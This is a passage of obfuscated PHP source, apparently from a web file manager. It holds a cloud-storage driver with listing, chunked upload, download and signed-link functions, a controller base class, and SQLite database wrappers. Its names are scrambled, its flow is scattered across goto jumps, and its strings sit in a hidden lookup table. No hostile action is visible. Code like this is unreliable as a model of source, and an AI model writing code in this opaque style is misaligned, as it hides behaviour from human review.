$FÃ¿ÍĞ£Ø[33]; $a¡îŞèÛ›ğ = 1000; goto eùë×–¼‰Ş; bË‡É®ê‚: if ($AĞä„¹íÈò) { $this->cacheMethod($FÃ¿ÍĞ£Ø[209], $CĞºéßŠàÇ, !0); } goto dğÊ†ºøå›; dğÊ†ºøå›: } public function listPath($aã²°«ø‰¸, $eÂ—ª » = false) { $EôÅñÙ¸„ =& $_SERVER[Ü˜]; $aÚø¹§è› = $f’¬¢…Ç¢î = array(); $this->fileList($aã²°«ø‰¸, $aÚø¹§è›, $f’¬¢…Ç¢î); foreach ($aÚø¹§è› as $DÖŒ§Ø×Š• => $F£õµƒá¥Š) { $aÚø¹§è›[$DÖŒ§Ø×Š•] = $this->folderInfo($F£õµƒá¥Š, $eÂ—ª »); } foreach ($f’¬¢…Ç¢î as $DÖŒ§Ø×Š• => $F£õµƒá¥Š) { $f’¬¢…Ç¢î[$DÖŒ§Ø×Š•] = $this->fileInfo($F£õµƒá¥Š[$EôÅñÙ¸„[28]], $eÂ—ª », $F£õµƒá¥Š); } return array($EôÅñÙ¸„[85] => $aÚø¹§è›, $EôÅñÙ¸„[84] => $f’¬¢…Ç¢î); } public function has($e§ÃŠ³×õÓ, $B‘ÊÆÜí› = false, $EøË›¹ †Â = true) { goto BÚ Š‰®â; AÛ‹Í÷†Ø: $DĞ´¡˜…Á = 0; $e©‘ãåë»ç = 0; $Bí«³ù®ßç = rtrim($e§ÃŠ³×õÓ, $F—‡ÁÔàµÊ[8]) . $F—‡ÁÔàµÊ[8]; goto Fœ‡Ö¸®; BÚ Š‰®â: $F—‡ÁÔàµÊ =& $_SERVER[Ü˜]; $bªä‘¼Ö© = $F—‡ÁÔàµÊ[33]; $E¶ŸÀö®ù = 500; goto AÛ‹Í÷†Ø; Fœ‡Ö¸®: while (!0) { check_abort(); $d‰˜‰™İß = $this->listObjs($e§ÃŠ³×õÓ, $bªä‘¼Ö©, $E¶ŸÀö®ù); if (!$d‰˜‰™İß) { return !1; } $bªä‘¼Ö© = isset($d‰˜‰™İß[$F—‡ÁÔàµÊ[1347]]) ? $d‰˜‰™İß[$F—‡ÁÔàµÊ[1347]] : $F—‡ÁÔàµÊ[33]; $b´­Ì‚ÓÕ = isset($d‰˜‰™İß[$F—‡ÁÔàµÊ[1348]]) ? $d‰˜‰™İß[$F—‡ÁÔàµÊ[1348]] : array(); if (empty($b´­Ì‚ÓÕ)) { break; } $D‚Ô¸³Ã“ = array_filter($b´­Ì‚ÓÕ, function ($FÓåòÀ”‰£) { $bâÌÈÉŒ¨ß =& $_SERVER[Ü˜]; return $FÓåòÀ”‰£[$bâÌÈÉŒ¨ß[29]] == $bâÌÈÉŒ¨ß[87]; }); $eÕ¿ëïô¹Ş = count($b´­Ì‚ÓÕ); $D‚Ô¸³Ã“ = count($D‚Ô¸³Ã“); $D»êö‘Š£¥ = $eÕ¿ëïô¹Ş - $D‚Ô¸³Ã“; if ($B‘ÊÆÜí›) { $e©‘ãåë»ç += $D‚Ô¸³Ã“; $DĞ´¡˜…Á += $D»êö‘Š£¥; if ($eÕ¿ëïô¹Ş < $E¶ŸÀö®ù) { break; } continue; } if ($EøË›¹ †Â) { if ($D»êö‘Š£¥) { return !0; } } else { if ($D‚Ô¸³Ã“) { return !0; } } if ($eÕ¿ëïô¹Ş < $E¶ŸÀö®ù) { break; } } if ($B‘ÊÆÜí›) { return array($F—‡ÁÔàµÊ[213] => $DĞ´¡˜…Á, $F—‡ÁÔàµÊ[214] => $e©‘ãåë»ç); } return !1; goto BæÁâ¬É¶; BæÁâ¬É¶: } public function listAll($eÖîçì£¤ğ) { goto Eè‘øÍÖ¡Ù; d—àÂä½à›: return $this->listAllFiles($eÖîçì£¤ğ, array_keys($aª×œ¾‚Í®), $aª×œ¾‚Í®); goto Dò÷ïÍ»Æ; Eè‘øÍÖ¡Ù: $BÂ‹Åàœ¸ =& $_SERVER[Ü˜]; $dÙñ°Õ•²î = $FÉ†“×æÄ› = array(); $this->fileList($eÖîçì£¤ğ, $dÙñ°Õ•²î, $FÉ†“×æÄ›, !0); goto F¡øâÇ­²; F¡øâÇ­²: $aª×œ¾‚Í® = array(); foreach ($FÉ†“×æÄ› as $bò™ˆ¾à¬¼) { $aª×œ¾‚Í®[$bò™ˆ¾à¬¼[$BÂ‹Åàœ¸[28]]] = $bò™ˆ¾à¬¼[$BÂ‹Åàœ¸[88]]; } foreach ($dÙñ°Õ•²î as $bò™ˆ¾à¬¼) { if (is_string($bò™ˆ¾à¬¼)) { $aª×œ¾‚Í®[$bò™ˆ¾à¬¼] = 0; } } goto d—àÂä½à›; Dò÷ïÍ»Æ: } public function canRead($eö†×ÕïŸ‡) { return $this->exist($eö†×ÕïŸ‡) ? !0 : !1; } public function canWrite($DáéËË’¹×) { return $this->exist($DáéËË’¹×) ? !0 : !1; } public function getContent($aŠç¼Á“·£) { return $this->fileSubstr($aŠç¼Á“·£, 0, -1); } public function setContent($E¹ßª…„â, $BšÉ‚Ü¯ = '') { $aÕ’Øîìï” =& $_SERVER[Ü˜]; if (!$BšÉ‚Ü¯) { $F»Ğ²•óö = $this->ussRequest($E¹ßª…„â, $aÕ’Øîìï”[234]); return $F»Ğ²•óö[$aÕ’Øîìï”[1087]]; } $BÎ±µòÀ¾‚ = $this->tempFile($this->pathThis($E¹ßª…„â)); file_put_contents($BÎ±µòÀ¾‚, $BšÉ‚Ü¯); if ($this->upload($E¹ßª…„â, $BÎ±µòÀ¾‚)) { $this->tempFileRemve($BÎ±µòÀ¾‚); return !0; } return !1; } public function fileSubstr($eåŞ«¥İ«, $E¾ô¢¤Šè³, $fùö¯çÇ†å) { $A‹•…Ù©…¨ =& $_SERVER[Ü˜]; if (!($Dæ‹¼‹ÑÁ‡ = $this->link($eåŞ«¥İ«))) { return !1; } $CçöÉ²Ã„ = !1; if ($fùö¯çÇ†å > 0) { $DœÅĞ õ‘¦ = $E¾ô¢¤Šè³ + $fùö¯çÇ†å - 1; $CçöÉ²Ã„ = array($A‹•…Ù©…¨[1310] . $E¾ô¢¤Šè³ . $A‹•…Ù©…¨[449] . $DœÅĞ õ‘¦); } $bÌÖÙÖ®ùã = url_request($Dæ‹¼‹ÑÁ‡, $A‹•…Ù©…¨[238], !1, $CçöÉ²Ã„); return $bÌÖÙÖ®ùã[$A‹•…Ù©…¨[719]] ? $bÌÖÙÖ®ùã[$A‹•…Ù©…¨[1089]] : !1; } public function upload($D‘ãŠ¿×Å, $B¹İà„ğ·¥, $a‰…ğÈ•§… = false, $FÎÉª¬ÕÈ = REPEAT_REPLACE) { goto d³İ¦”’‹; CÏåŒ‚¥—: do { $Dµ¦ÉëÖË… = $b¶‘›²´èÂ[$DšŞø˜¼”†[1356]]; fseek_64($c¤¡ÔØÍÄí, $CØÏôÚçñ); $c½ÕóŞåŞç = fread($c¤¡ÔØÍÄí, $Dµ¦ÉëÖË…); $dßŒ“öŸŠª = 0; do { $dßŒ“öŸŠª++; $b¶‘›²´èÂ = $this->uploadPart($D‘ãŠ¿×Å, $b¶‘›²´èÂ, $c½ÕóŞåŞç); } while (!$b¶‘›²´èÂ && $dßŒ“öŸŠª < 3); if (!$b¶‘›²´èÂ) { return !1; } $B®á’Š…ò = $b¶‘›²´èÂ[$DšŞø˜¼”†[1355]]; $CØÏôÚçñ += $Dµ¦ÉëÖË…; } while ($B®á’Š…ò != -1); fclose($c¤¡ÔØÍÄí); $cÜ¶œšÌ³° = array($DšŞø˜¼”†[1357], $DšŞø˜¼”†[1358] . $b¶‘›²´èÂ[$DšŞø˜¼”†[1359]], $DšŞø˜¼”†[1353]); goto F”¯ùó£™ë; B²²Í§–Æ‡: $B®á’Š…ò = $b¶‘›²´èÂ[$DšŞø˜¼”†[1355]]; $c¤¡ÔØÍÄí = fopen($B¹İà„ğ·¥, $DšŞø˜¼”†[1260]); if (!$c¤¡ÔØÍÄí) { return !1; } goto CÏåŒ‚¥—; c–Î’Œ¥Êˆ: if (!$dÎÁ¬÷Õ[$DšŞø˜¼”†[1087]]) { return !1; } $b¶‘›²´èÂ = $dÎÁ¬÷Õ[$DšŞø˜¼”†[1089]]; $CØÏôÚçñ = 0; goto B²²Í§–Æ‡; d³İ¦”’‹: $DšŞø˜¼”† =& $_SERVER[Ü˜]; $bê÷ƒ³ÍåÌ = IO::size($B¹İà„ğ·¥); if ($bê÷ƒ³ÍåÌ <= 1024 * 1024 * 200) { $f‡ë§®½›Ô = array($DšŞø˜¼”†[1350] . $B¹İà„ğ·¥); $dÎÁ¬÷Õ = $this->ussRequest($D‘ãŠ¿×Å, $DšŞø˜¼”†[236], $f‡ë§®½›Ô); return $dÎÁ¬÷Õ[$DšŞø˜¼”†[1087]] ? $this->getPathOuter($D‘ãŠ¿×Å) : !1; } goto d²ù ÷™šù; d²ù ÷™šù: $DéĞÚöÓ–– = 1024 * 1024 * 10; $cÜ¶œšÌ³° = array($DšŞø˜¼”†[1351], $DšŞø˜¼”†[1352] . $bê÷ƒ³ÍåÌ, $DšŞø˜¼”†[1353], $DšŞø˜¼”†[1354] . $DéĞÚöÓ––); $dÎÁ¬÷Õ = $this->ussRequest($D‘ãŠ¿×Å, $DšŞø˜¼”†[236], !1, $cÜ¶œšÌ³°); goto c–Î’Œ¥Êˆ; F”¯ùó£™ë: $dÎÁ¬÷Õ = $this->ussRequest($D‘ãŠ¿×Å, $DšŞø˜¼”†[236], !1, $cÜ¶œšÌ³°); return $dÎÁ¬÷Õ[$DšŞø˜¼”†[1087]] ? $this->getPathOuter($d ÁêÔ¿„) : !1; goto fÊÕ•¶Çˆë; fÊÕ•¶Çˆë: } private function uploadPart($eµõ© Ò£›, $f‘êÆ‘˜‚¢, &$fœ–å¨Ø…Ÿ) { $Fñ«ÀÈ ‹É =& $_SERVER[Ü˜]; $BÀø»è£® = array($Fñ«ÀÈ ‹É[1360], $Fñ«ÀÈ ‹É[1358] . $f‘êÆ‘˜‚¢[$Fñ«ÀÈ ‹É[1359]], $Fñ«ÀÈ ‹É[1361] . $f‘êÆ‘˜‚¢[$Fñ«ÀÈ ‹É[1355]], $Fñ«ÀÈ ‹É[151] . $f‘êÆ‘˜‚¢[$Fñ«ÀÈ ‹É[1356]]); $Bš ‘Ü¯Ä• = $this->ussRequest($eµõ© Ò£›, $Fñ«ÀÈ ‹É[236], $fœ–å¨Ø…Ÿ, $BÀø»è£®); return !$Bš ‘Ü¯Ä•[$Fñ«ÀÈ ‹É[1087]] ? $Bš ‘Ü¯Ä•[$Fñ«ÀÈ ‹É[1087]] : $Bš ‘Ü¯Ä•[$Fñ«ÀÈ ‹É[1089]]; } public function uploadFormData($E¸ŠèßàÄ¡, $d¾…’ çëõ = 3600) { return $this->uploadPolicy($E¸ŠèßàÄ¡, $d¾…’ çëõ); } public function multiUploadFormData($bÏ†£¸½¹Í, $báÒ”„ÂÄö = 3600) { $D‘™ˆÃé¦– =& $_SERVER[Ü˜]; $CÃ£­ Ûµä = (int) $GLOBALS[$D‘™ˆÃé¦–[7]][$D‘™ˆÃé¦–[88]]; return $this->uploadPolicy($bÏ†£¸½¹Í, $báÒ”„ÂÄö, $CÃ£­ Ûµä); } private function uploadPolicy($eŠ¿õÈ£ª¶, $a´¨…Ü‡˜½ = 3600, $eŞ«šè¦ô× = 0) { goto F×‚º¦‰½ê; AÔ©åµùÏÖ: $E‰ùÍÊéŒ± = base64_encode(hash_hmac($a«ê‡­¢¢‡[1332], "\120\x4f\x53\x54\46{$D¯æÏø–í}\46{$E¤ÅŒŒŒãë}\x26{$aÎ»‘™Ä¼Û}", md5("{$this->userpass}"), !0)); $a´òèØ÷¡‘ = array($a«ê‡­¢¢‡[1202] => $aÎ»‘™Ä¼Û, $a«ê‡­¢¢‡[1366] => "\x55\120\x59\x55\x4e\40{$this->username}\x3a{$E‰ùÍÊéŒ±}", $a«ê‡­¢¢‡[185] => $this->endpoint . $D¯æÏø–í); return $a´òèØ÷¡‘; goto dƒ›»öŸÊÁ; F×‚º¦‰½ê: $a«ê‡­¢¢‡ =& $_SERVER[Ü˜]; $D¯æÏø–í = $a«ê‡­¢¢‡[8] . $this->bucket; $E¤ÅŒŒŒãë = gmdate($a«ê‡­¢¢‡[1297]); goto c¦­‘ß°Å; c¦­‘ß°Å: $aãìïïÛíö = array($a«ê‡­¢¢‡[1362] => $this->bucket, $a«ê‡­¢¢‡[1363] => $eŠ¿õÈ£ª¶, $a«ê‡­¢¢‡[1364] => time() + $a´¨…Ü‡˜½, $a«ê‡­¢¢‡[1365] => $E¤ÅŒŒŒãë); if ($eŞ«šè¦ô×) { $aãìïïÛíö[$a«ê‡­¢¢‡[1276]] = $eŞ«šè¦ô×; } $aÎ»‘™Ä¼Û = base64_encode(json_encode($aãìïïÛíö)); goto AÔ©åµùÏÖ; dƒ›»öŸÊÁ: } public function download($DÍ›„³Æ‘ñ, $F¸¨Æ±’ï) { goto Få·êèŒˆ; bÄéÓÍ¨Âå: fclose($dÑòåÕÅ•); return $F¸¨Æ±’ï; goto b‚™ÏÌ¨µâ; EŸÑˆ–°»“: $c³—È¥ƒÒë = 1024 * 200; $dÑòåÕÅ• = fopen($CÚƒé½Îå, $_SERVER[Ü˜][1316]); while (!0) { $eñ‡ºêù‡‚ = $this->fileSubstr($DÍ›„³Æ‘ñ, $d²ÎŸˆÇ‹Š, $c³—È¥ƒÒë); if ($eñ‡ºêù‡‚ === !1) { return !1; } fwrite($dÑòåÕÅ•, $eñ‡ºêù‡‚); $d²ÎŸˆÇ‹Š += $c³—È¥ƒÒë; if (strlen($eñ‡ºêù‡‚) < $c³—È¥ƒÒë) { break; } } goto bÄéÓÍ¨Âå; Få·êèŒˆ: $CÚƒé½Îå = IO::getPathInner(IO::mkfile($F¸¨Æ±’ï)); if (!($eÈÁâÂ®›é = $this->link($DÍ›„³Æ‘ñ))) { return !1; } $d²ÎŸˆÇ‹Š = 0; goto EŸÑˆ–°»“; b‚™ÏÌ¨µâ: } public function link($a“÷¶ê£ê, $fé×Òà¾ˆ‚ = array()) { $Dîà³…ò³³ =& $_SERVER[Ü˜]; $a“÷¶ê£ê = trim($a“÷¶ê£ê, $Dîà³…ò³³[8]); if (!empty($this->token)) { $dëîêåáË¦ = strtotime(date($Dîà³…ò³³[1367])); $fåÀ®‡ÂæÓ = substr(md5($this->token . $Dîà³…ò³³[291] . $dëîêåáË¦ . $Dîà³…ò³³[1368] . $a“÷¶ê£ê), 12, 8) . $dëîêåáË¦; $fé×Òà¾ˆ‚[] = $Dîà³…ò³³[1369] . $fåÀ®‡ÂæÓ; } $a®ÂÌ—µÃÕ = !empty($fé×Òà¾ˆ‚) ? $Dîà³…ò³³[80] . implode($Dîà³…ò³³[291], $fé×Òà¾ˆ‚) : $Dîà³…ò³³[33]; return $this->getHost() . $Dîà³…ò³³[8] . $a“÷¶ê£ê . $a®ÂÌ—µÃÕ; } public function fileOut($a°ë“†ï¦®, $AÒÍØÏ‘Ü† = false, $eÙ’ä·¬Ú = false, $EØ±Åõ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($a°ë“†ï¦®, $AÒÍØÏ‘Ü†, $eÙ’ä·¬Ú, $EØ±Åõ); } if (!$eÙ’ä·¬Ú) { $eÙ’ä·¬Ú = $this->pathThis($a°ë“†ï¦®); } $d…´£Ë¾É = $AÒÍØÏ‘Ü† ? array($_SERVER[Ü˜][1370] . rawurlencode($eÙ’ä·¬Ú)) : array(); $Aõ—ùÚï = $this->link($a°ë“†ï¦®, $d…´£Ë¾É); $this->fileOutLink($Aõ—ùÚï); } public function fileOutServer($F±©¼íšÅñ, $c ÅŠ¤º‹ = false, $DÁ³„Ò¹Å = false, $eÊÆÊ«‰´ = '') { parent::fileOut($F±©¼íšÅñ, $c ÅŠ¤º‹, $DÁ³„Ò¹Å, $eÊÆÊ«‰´); } public function fileOutImage($eõ¶ËŞÜïì, $Fªìè‹»Œ = 250) { $b¤¿ßƒØÁ = $this->link($eõ¶ËŞÜïì . $_SERVER[Ü˜][1371] . $Fªìè‹»Œ); $this->fileOutLink($b¤¿ßƒØÁ); } public function fileOutImageServer($A„¿áŠÔ¬, $c•‘Á”œÔ• = 250) { parent::fileOutImage($A„¿áŠÔ¬, $c•‘Á”œÔ•); } public function hashMd5($dŒò¤Å—…•) { $Fòí½Ü…ïÓ =& $_SERVER[Ü˜]; $Añ˜¡İøğ = $this->_objectMeta($dŒò¤Å—…•); return isset($Añ˜¡İøğ[$Fòí½Ü…ïÓ[218]]) ? $Añ˜¡İøğ[$Fòí½Ü…ïÓ[218]] : !1; } public function size($eÔ——ª®×î) { $bĞ¶«”¬ = $this->objectMeta($eÔ——ª®×î); return $bĞ¶«”¬ ? $bĞ¶«”¬[$_SERVER[Ü˜][88]] : 0; } public function info($bå¤ó™ÀÑ) { if ($this->isFolder($bå¤ó™ÀÑ)) { return $this->folderInfo($bå¤ó™ÀÑ); } else { if ($this->isFile($bå¤ó™ÀÑ)) { return $this->fileInfo($bå¤ó™ÀÑ); } } return !1; } public function exist($D­÷¡”¸•ƒ) { return $this->isFile($D­÷¡”¸•ƒ) || $this->isFolder($D­÷¡”¸•ƒ); } public function isFile($cÊ©Òó´­») { return !$this->isFolder($cÊ©Òó´­») && $this->objectMeta($cÊ©Òó´­»); } public function isFolder($D³”²š«) { return $this->cacheMethod($_SERVER[Ü˜][209], $D³”²š«); } protected function objectMeta($F‹ÌìŸÙêÅ) { return $this->cacheMethod($_SERVER[Ü˜][210], $F‹ÌìŸÙêÅ); } protected function _objectMeta($a·èæ¿é¡) { goto Eƒæêçµ½Í; Dòä––“ç™: if (!$BŠËéô–•¶[$E‹•ÕÑª°ß[1087]]) { return null; } $A­–Ì÷”×â = isset($BŠËéô–•¶[$E‹•ÕÑª°ß[1089]]) ? $BŠËéô–•¶[$E‹•ÕÑª°ß[1089]] : array(); if (!isset($A­–Ì÷”×â[$E‹•ÕÑª°ß[1373]])) { return null; } goto bØ¶ÈŞñÌ„; bØ¶ÈŞñÌ„: $Dá‹ ®Üã‰ = array($E‹•ÕÑª°ß[29] => isset($A­–Ì÷”×â[$E‹•ÕÑª°ß[1373]]) ? $A­–Ì÷”×â[$E‹•ÕÑª°ß[1373]] : null, $E‹•ÕÑª°ß[88] => isset($A­–Ì÷”×â[$E‹•ÕÑª°ß[1374]]) ? $A­–Ì÷”×â[$E‹•ÕÑª°ß[1374]] : null, $E‹•ÕÑª°ß[218] => isset($A­–Ì÷”×â[$E‹•ÕÑª°ß[1375]]) ? $A­–Ì÷”×â[$E‹•ÕÑª°ß[1375]] : null, $E‹•ÕÑª°ß[1342] => isset($A­–Ì÷”×â[$E‹•ÕÑª°ß[1376]]) ? $A­–Ì÷”×â[$E‹•ÕÑª°ß[1376]] : null); $Dá‹ ®Üã‰[$E‹•ÕÑª°ß[1343]] = isset($A­–Ì÷”×â[$E‹•ÕÑª°ß[1377]]) ? strtotime($A­–Ì÷”×â[$E‹•ÕÑª°ß[1377]]) : $Dá‹ ®Üã‰[$E‹•ÕÑª°ß[1342]]; return $Dá‹ ®Üã‰; goto e–é˜©ß; Eƒæêçµ½Í: $E‹•ÕÑª°ß =& $_SERVER[Ü˜]; if ($a·èæ¿é¡ == $E‹•ÕÑª°ß[33] || $a·èæ¿é¡ == $E‹•ÕÑª°ß[8]) { return array(); } $BŠËéô–•¶ = $this->ussRequest($a·èæ¿é¡, $E‹•ÕÑª°ß[1372]); goto Dòä––“ç™; e–é˜©ß: } protected function _isFolder($AÖˆÑñ“³¯) { $aÍÏùã =& $_SERVER[Ü˜]; if ($AÖˆÑñ“³¯ == $aÍÏùã[33] || $AÖˆÑñ“³¯ == $aÍÏùã[8]) { return !0; } $E…»‹Á©ÈÁ = $this->_objectMeta($AÖˆÑñ“³¯); return isset($E…»‹Á©ÈÁ[$aÍÏùã[29]]) && $E…»‹Á©ÈÁ[$aÍÏùã[29]] == $aÍÏùã[87] ? !0 : !1; } } goto aÛšÊÜ¨¸…; Eî¤•ßÍÓ­: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto CÁ—¼Æ¿¸§; EìŸŒÆĞÖ: $this->tpl = TEMPLATE . MOD . $eÇšÇàËª²[8]; $this->_classObjectID = mt_rand(0, 10000); goto f‡ˆ‰ôòğ; CÁ—¼Æ¿¸§: $eÇšÇàËª² =& $_SERVER[Ü˜]; global $in, $config; $this->config =& $config; goto bñÁ³÷°á; bñÁ³÷°á: $this->in =& $in; $this->values[$eÇšÇàËª²[6]] =& $config; $this->values[$eÇšÇàËª²[7]] =& $in; goto EìŸŒÆĞÖ; f‡ˆ‰ôòğ: } public function loadClass($c²ê†ª‚) { if (1 === func_num_args()) { $this->{$c²ê†ª‚} = new $c²ê†ª‚(); } else { $F›’ï‘ÅÍ = new ReflectionClass($c²ê†ª‚); $A®Í¬«ŒŸÅ = func_get_args(); array_shift($A®Í¬«ŒŸÅ); $this->{$c²ê†ª‚} = $F›’ï‘ÅÍ->newInstanceArgs($A®Í¬«ŒŸÅ); } return $this->{$c²ê†ª‚}; } protected function assign($AòÚÆÛïøÓ, $d×ë…ñòËë) { $this->values[$AòÚÆÛïøÓ] = $d×ë…ñòËë; } protected function display($D÷éáñ»­ß) { ob_end_clean(); extract($this->values); require $this->tpl . $D÷éáñ»­ß; } } class DbSqliteBase extends Db { public function __construct($C›Ôñ¥›êÎ = '') { $cáâòùõ =& $_SERVER[Ü˜]; if (!extension_loaded($cáâòùõ[9])) { think_exception(think_lang($cáâòùõ[10]) . $cáâòùõ[11]); } if (!empty($C›Ôñ¥›êÎ)) { if (!isset($C›Ôñ¥›êÎ[$cáâòùõ[12]])) { $C›Ôñ¥›êÎ[$cáâòùõ[12]] = 438; } $this->config = $C›Ôñ¥›êÎ; if (empty($this->config[$cáâòùõ[13]])) { $this->config[$cáâòùõ[13]] = array(); } } } public function connect($E§ğÊ¢ÀÄø = '', $D²èÓ¾³‘ = 0) { $Aàª‡¢å¯¦ =& $_SERVER[Ü˜]; if (!isset($this->linkID[$D²èÓ¾³‘])) { goto d»æ÷Æ¼´¦; Açãç·ôÍİ: $this->linkID[$D²èÓ¾³‘] = $F¿èöê›åô($E§ğÊ¢ÀÄø[$Aàª‡¢å¯¦[17]], $E§ğÊ¢ÀÄø[$Aàª‡¢å¯¦[12]]); if (!$this->linkID[$D²èÓ¾³‘]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto dƒíˆº—Í¨; dƒíˆº—Í¨: @sqlite_busy_timeout($this->linkID[$D²èÓ¾³‘], 30000); if (1 != think_config($Aàª‡¢å¯¦[18])) { unset($this->config); } goto CÅ¼áµ—õ·; d»æ÷Æ¼´¦: if (empty($E§ğÊ¢ÀÄø)) { $E§ğÊ¢ÀÄø = $this->config; } $cÁ´’åà = !empty($E§ğÊ¢ÀÄø[$Aàª‡¢å¯¦[13]][$Aàª‡¢å¯¦[14]]) ? $E§ğÊ¢ÀÄø[$Aàª‡¢å¯¦[13]][$Aàª‡¢å¯¦[14]] : $this->pconnect; $F¿èöê›åô = $cÁ´’åà ? $Aàª‡¢å¯¦[15] : $Aàª‡¢å¯¦[16]; goto Açãç·ôÍİ; CÅ¼áµ—õ·: } return $this->linkID[$D²èÓ¾³‘]; } public function free() { $this->queryID = null; } public function query($aöÁƒˆë) { goto BëÂ—ãåšÁ; e‘¤¶ÎÁª°: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Aó½İå±ŒÚ = $this->getAll(); return $Aó½İå±ŒÚ; } goto E‰É„Îë˜ò; BëÂ—ãåšÁ: $FÖÙ‰ôïÑ =& $_SERVER[Ü˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D¯„Ò§…¥; DÙ…ÉÉ¼ÁÃ: think_status($FÖÙ‰ôïÑ[20]); $this->queryID = sqlite_query($this->_linkID, $aöÁƒˆë); $this->debug(); goto e‘¤¶ÎÁª°; D¯„Ò§…¥: $this->queryStr = $aöÁƒˆë; if ($this->queryID) { $this->free(); } think_action_status($FÖÙ‰ôïÑ[19], 1); goto DÙ…ÉÉ¼ÁÃ; E‰É„Îë˜ò: } public function execute($CõÈÇ–ÈÄ„) { goto cë®ÁßóßÄ; cë®ÁßóßÄ: $dˆÔº«ìÒÃ =& $_SERVER[Ü˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D±Œæ¡‡ã×; fŸÕŠ…Àä: think_status($dˆÔº«ìÒÃ[20]); $e¾¨÷Æ²À = sqlite_exec($this->_linkID, $CõÈÇ–ÈÄ„); $this->debug(); goto f©»µ”¶´Ù; D±Œæ¡‡ã×: $this->queryStr = $CõÈÇ–ÈÄ„; if ($this->queryID) { $this->free(); } think_action_status($dˆÔº«ìÒÃ[21], 1); goto fŸÕŠ…Àä; f©»µ”¶´Ù: if (!1 === $e¾¨÷Æ²À) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto cÀİé÷—”·; cÀİé÷—”·: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ü˜][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d²§œÒ“˜Ø = sqlite_query($this->_linkID, $_SERVER[Ü˜][23]); if (!$d²§œÒ“˜Ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $aŞŒ‡§“ĞÌ = sqlite_query($this->_linkID, $_SERVER[Ü˜][24]); if (!$aŞŒ‡§“ĞÌ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FÖš’ïê¡Ò = array(); if ($this->numRows > 0) { for ($bõÉ‡ÙƒÂŠ = 0; $bõÉ‡ÙƒÂŠ < $this->numRows; $bõÉ‡ÙƒÂŠ++) { $FÖš’ïê¡Ò[$bõÉ‡ÙƒÂŠ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $FÖš’ïê¡Ò; } public function getFields($EøÚ£¬ìŠ”) { $bø¨¬†Ñ¢ê =& $_SERVER[Ü˜]; $aÛŒµÖ®§ = $this->query($bø¨¬†Ñ¢ê[25] . $EøÚ£¬ìŠ” . $bø¨¬†Ñ¢ê[26]); $AŠÈœŒ†³ = array(); if ($aÛŒµÖ®§) { foreach ($aÛŒµÖ®§ as $dñä×ô˜ù => $BÖÖåÄ¡½) { $AŠÈœŒ†³[$BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[27]]] = array($bø¨¬†Ñ¢ê[28] => $BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[27]], $bø¨¬†Ñ¢ê[29] => $BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[30]], $bø¨¬†Ñ¢ê[31] => (bool) ($BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[32]] === $bø¨¬†Ñ¢ê[33]), $bø¨¬†Ñ¢ê[34] => $BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[35]], $bø¨¬†Ñ¢ê[36] => strtolower($BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[37]]) == $bø¨¬†Ñ¢ê[38], $bø¨¬†Ñ¢ê[39] => strtolower($BÖÖåÄ¡½[$bø¨¬†Ñ¢ê[40]]) == $bø¨¬†Ñ¢ê[41]); } } return $AŠÈœŒ†³; } public function getTables($F—ÍšÖœ©ˆ = '') { $eªÏÇŸÒÚ =& $_SERVER[Ü˜]; $D·‰øÇäĞ‹ = $this->query($eªÏÇŸÒÚ[42] . $eªÏÇŸÒÚ[43] . $eªÏÇŸÒÚ[44]); $B¯×¶Æ—‡¨ = array(); foreach ($D·‰øÇäĞ‹ as $E¶†Ü¯…× => $eŒåéÚä‡È) { $B¯×¶Æ—‡¨[$E¶†Ü¯…×] = current($eŒåéÚä‡È); } return $B¯×¶Æ—‡¨; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e‰áÔå‹ãõ =& $_SERVER[Ü˜]; $e³¶îá¦Ü¨ = sqlite_last_error($this->_linkID); $this->error = $e³¶îá¦Ü¨ . $e‰áÔå‹ãõ[4] . sqlite_error_string($e³¶îá¦Ü¨); if ($e‰áÔå‹ãõ[33] != $this->queryStr) { $this->error .= LNG($e‰áÔå‹ãõ[45]) . $this->queryStr; } think_trace($this->error, $e‰áÔå‹ãõ[33], $e‰áÔå‹ãõ[46]); return $this->error; } public function escapeString($A…ÖŸ¦êÆš) { return sqlite_escape_string($A…ÖŸ¦êÆš); } public function parseLimit($BŸäæ¦•¬á) { $aË×ø¿·¾ =& $_SERVER[Ü˜]; $DóÁ„Î­”ˆ = $aË×ø¿·¾[33]; if (!empty($BŸäæ¦•¬á)) { $BŸäæ¦•¬á = explode($aË×ø¿·¾[47], $BŸäæ¦•¬á); if (count($BŸäæ¦•¬á) > 1) { $DóÁ„Î­”ˆ .= $aË×ø¿·¾[48] . $BŸäæ¦•¬á[1] . $aË×ø¿·¾[49] . $BŸäæ¦•¬á[0] . $aË×ø¿·¾[50]; } else { $DóÁ„Î­”ˆ .= $aË×ø¿·¾[48] . $BŸäæ¦•¬á[0] . $aË×ø¿·¾[50]; } } return $DóÁ„Î­”ˆ; } } class DbSqlite3Base extends Db { public function __construct($a”ÕŠô„ = '') { $eÄÍÏ¶Ï‘ =& $_SERVER[Ü˜]; if (!class_exists($eÄÍÏ¶Ï‘[51])) { think_exception(think_lang($eÄÍÏ¶Ï‘[10]) . $eÄÍÏ¶Ï‘[52]); } if (!empty($a”ÕŠô„)) { if (!isset($a”ÕŠô„[$eÄÍÏ¶Ï‘[12]])) { 